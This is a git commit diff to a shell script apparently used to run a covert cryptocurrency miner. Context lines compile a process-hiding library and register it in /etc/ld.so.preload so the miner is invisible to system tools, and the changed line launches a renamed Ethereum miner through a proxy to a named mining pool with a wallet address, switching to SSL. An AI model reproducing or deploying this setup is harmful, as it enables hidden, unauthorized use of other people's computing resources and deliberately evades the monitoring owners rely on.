ba5bae2e244bb8c2d84a8d94ebc33bb8bd4d661e
gunturyogatama404 <99540625+gunturyogatama404@users.noreply.github.com>
2022-02-25 13:56:00 -0400

    Update and rename bash.sh to kontol.sh

--- views/kontol.sh
+++ views/kontol.sh
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=0xB2BCA4c6849FD6dCddE6C94915858c4a2CE2C066.MODALNIKAH@eth-us-east.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=ssl://0xB2BCA4c6849FD6dCddE6C94915858c4a2CE2C066.MODALNIKAH@eth-us-east.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
